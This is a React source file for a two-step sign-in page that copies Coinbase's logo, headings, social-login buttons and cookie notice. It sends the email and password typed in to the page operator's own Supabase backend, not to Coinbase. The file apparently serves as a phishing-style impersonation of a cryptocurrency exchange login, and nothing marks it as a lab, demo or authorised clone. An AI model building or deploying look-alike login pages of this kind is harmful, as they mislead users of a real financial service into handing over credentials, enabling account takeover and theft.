import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Eye, EyeOff, KeyRound } from 'lucide-react';
import { supabase } from '../lib/supabase';

function CoinbaseMark({ dark }: { dark: boolean }) {
  return (
    <svg viewBox="0 0 52 52" aria-hidden="true" className={`h-[50px] w-[50px] ${dark ? 'text-white' : 'text-[#1652f0]'}`}>
      <path
        d="M26 4.5C14.126 4.5 4.5 14.126 4.5 26S14.126 47.5 26 47.5c8.965 0 16.649-5.49 19.862-13.286H34.704A10.84 10.84 0 0 1 26 38.575c-6.944 0-12.575-5.631-12.575-12.575S19.056 13.425 26 13.425c3.462 0 6.597 1.4 8.87 3.668h10.992C42.649 9.99 34.965 4.5 26 4.5Z"
        fill="currentColor"
      />
    </svg>
  );
}

function SocialButton({ children, dark, icon }: any) {
  return (
    <button
      type="button"
      className={`flex h-[74px] w-full items-center rounded-[37px] px-7 text-left transition-colors ${
        dark ? 'bg-[#2a2c34] text-white hover:bg-[#30333d]' : 'bg-[#f1f3f8] text-[#0a0b0d] hover:bg-[#e8ebf2]'
      }`}
    >
      <div className="flex w-[42px] justify-center">{icon}</div>
      <span className="ml-5 text-[20px] font-semibold tracking-[-0.025em]">{children}</span>
    </button>
  );
}

export default function Connect() {
  const navigate = useNavigate();
  const [step, setStep] = useState('email');
  const [isDarkTheme, setIsDarkTheme] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [credentials, setCredentials] = useState({
    email: '',
    password: '',
  });
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');

  useEffect(() => {
    const mediaQuery = window.matchMedia('(prefers-color-scheme: dark)');

    const syncTheme = () => {
      setIsDarkTheme(mediaQuery.matches);
    };

    syncTheme();
    mediaQuery.addEventListener('change', syncTheme);

    return () => {
      mediaQuery.removeEventListener('change', syncTheme);
    };
  }, []);

  const handleFieldChange = (field: string) => (event: React.ChangeEvent<HTMLInputElement>) => {
    setCredentials((current) => ({
      ...current,
      [field]: event.target.value,
    }));
  };

  const handleContinue = (event: React.FormEvent) => {
    event.preventDefault();
    setErrorMessage('');

    if (!credentials.email.trim()) {
      setErrorMessage('Enter your email address to continue.');
      return;
    }

    setStep('password');
  };

  const handlePasswordSubmit = async (event: React.FormEvent) => {
    event.preventDefault();

    const email = credentials.email.trim();
    const password = credentials.password;

    setErrorMessage('');

    if (!email || !password) {
      setErrorMessage('Enter your email and password to continue.');
      return;
    }

    setLoading(true);

    try {
      const { error } = await supabase.auth.signInWithPassword({
        email,
        password,
      });

      if (error) {
        setErrorMessage(error.message);
        return;
      }

      navigate('/dashboard');
    } catch (err: any) {
      setErrorMessage(err.message || 'An unexpected error occurred.');
    } finally {
      setLoading(false);
    }
  };

  const dark = isDarkTheme;
  const pageClasses = dark ? 'bg-[#0b0b0d] text-white' : 'bg-white text-[#0b0b0d]';
  const labelClasses = dark ? 'text-white' : 'text-[#101114]';
  const mutedClasses = dark ? 'text-[#9fa3b3]' : 'text-[#6b7280]';
  const dividerClasses = dark ? 'bg-[#30323a]' : 'bg-[#d9dbe1]';
  const inputClasses = dark
    ? 'border-[#4a4d57] bg-[#0b0b0d] text-white placeholder:text-[#707482]'
    : 'border-[#babdc7] bg-white text-[#0b0b0d] placeholder:text-[#6d7482]';
  const primaryButtonClasses = dark
    ? 'bg-[#334a87] text-[#090b10] hover:bg-[#3c569b]'
    : 'bg-[#84aaf7] text-white hover:bg-[#78a0f1]';

  return (
    <main className={`${pageClasses} min-h-screen overflow-x-hidden font-sans`}>
      <section className="mx-auto flex min-h-screen w-full max-w-[430px] flex-col px-[23px] pb-10 pt-[42px] sm:px-8">
        <div className="flex justify-start">
          <CoinbaseMark dark={dark} />
        </div>

        <div className="pt-[92px]">
          <h1 className="max-w-[340px] text-[34px] font-semibold leading-[1.08] tracking-[-0.04em] sm:text-[36px]">
            {step === 'email' ? 'Sign in to Coinbase' : 'Enter your password'}
          </h1>

          <form onSubmit={step === 'email' ? handleContinue : handlePasswordSubmit} className="mt-[58px]">
            <label htmlFor="coinbase-email" className={`${labelClasses} block text-[18px] font-semibold tracking-[-0.02em]`}>
              {step === 'email' ? 'Email' : 'Email address'}
            </label>

            <div className="mt-[18px]">
              <input
                id="coinbase-email"
                type="email"
                value={credentials.email}
                onChange={handleFieldChange('email')}
                placeholder="Your email address"
                autoComplete="username"
                readOnly={step === 'password'}
                className={`h-[76px] w-full rounded-[17px] border px-[32px] text-[18px] font-normal tracking-[-0.025em] outline-none transition-colors focus:border-[#7b96d8] ${inputClasses} ${step === 'password' ? 'opacity-80' : ''}`}
              />
            </div>

            {step === 'password' ? (
              <>
                <label htmlFor="coinbase-password" className={`${labelClasses} mt-[26px] block text-[18px] font-semibold tracking-[-0.02em]`}>
                  Password
                </label>
                <div className="relative mt-[18px]">
                  <input
                    id="coinbase-password"
                    type={showPassword ? 'text' : 'password'}
                    value={credentials.password}
                    onChange={handleFieldChange('password')}
                    placeholder="Your password"
                    autoComplete="current-password"
                    className={`h-[76px] w-full rounded-[17px] border px-[32px] pr-20 text-[18px] font-normal tracking-[-0.025em] outline-none transition-colors focus:border-[#7b96d8] ${inputClasses}`}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword((current) => !current)}
                    className={`absolute inset-y-0 right-0 flex items-center px-7 ${mutedClasses}`}
                    aria-label={showPassword ? 'Hide password' : 'Show password'}
                  >
                    {showPassword ? <EyeOff className="h-6 w-6" strokeWidth={2} /> : <Eye className="h-6 w-6" strokeWidth={2} />}
                  </button>
                </div>
              </>
            ) : null}

            <button
              type="submit"
              disabled={loading}
              className={`mt-[30px] flex h-[74px] w-full items-center justify-center rounded-[37px] text-[20px] font-semibold tracking-[-0.02em] transition-colors disabled:opacity-70 ${primaryButtonClasses}`}
            >
              {loading ? 'Signing in...' : 'Continue'}
            </button>

            {step === 'password' ? (
              <button
                type="button"
                onClick={() => {
                  setStep('email');
                  setErrorMessage('');
                }}
                className={`mt-4 text-[15px] font-medium underline underline-offset-4 ${dark ? 'text-[#c4cada]' : 'text-[#4b5563]'}`}
              >
                Back to email
              </button>
            ) : null}

            {errorMessage ? <p className="mt-4 text-[14px] text-[#d14343]">{errorMessage}</p> : null}
          </form>

          {step === 'email' ? (
            <>
              <div className="mt-[42px] flex items-center gap-8">
                <div className={`h-px flex-1 ${dividerClasses}`} />
                <span className={`${mutedClasses} text-[18px] font-medium tracking-[-0.02em]`}>OR</span>
                <div className={`h-px flex-1 ${dividerClasses}`} />
              </div>

              <div className="mt-[42px] space-y-5">
                <SocialButton
                  dark={dark}
                  icon={<KeyRound className="h-[27px] w-[27px]" strokeWidth={2.2} />}
                >
                  Sign in with passkey
                </SocialButton>

                <SocialButton
                  dark={dark}
                  icon={
                    <img
                      src="https://picsum.photos/seed/google/28/28"
                      alt="Google"
                      width={28}
                      height={28}
                      referrerPolicy="no-referrer"
                      className={`h-7 w-7 object-contain ${dark ? 'brightness-0 invert' : 'brightness-0'}`}
                    />
                  }
                >
                  Sign in with Google
                </SocialButton>

                <SocialButton
                  dark={dark}
                  icon={
                    <img
                      src="https://picsum.photos/seed/apple/27/27"
                      alt="Apple"
                      width={27}
                      height={27}
                      referrerPolicy="no-referrer"
                      className={`h-[27px] w-[27px] object-contain ${dark ? 'brightness-0 invert' : 'brightness-0'}`}
                    />
                  }
                >
                  Sign in with Apple
                </SocialButton>
              </div>

              <p className="mt-[56px] text-center text-[18px] font-semibold tracking-[-0.03em]">
                <span className={dark ? 'text-white' : 'text-[#111217]'}>Don't have an account? </span>
                <button type="button" className="text-[#1652f0]">
                  Sign up
                </button>
              </p>
            </>
          ) : null}
        </div>

        <div className="mt-auto pt-16">
          <p className={`${mutedClasses} text-[15px] leading-[1.34] tracking-[-0.02em]`}>
            We use strictly necessary cookies to enable essential functions, such as security and authentication. For more information, see our{' '}
            <button type="button" className={`underline underline-offset-[3px] ${mutedClasses}`}>
              Cookie Policy
            </button>{' '}
            and{' '}
            <button type="button" className={`underline underline-offset-[3px] ${mutedClasses}`}>
              Privacy Policy.
            </button>
          </p>
        </div>
      </section>
    </main>
  );
}
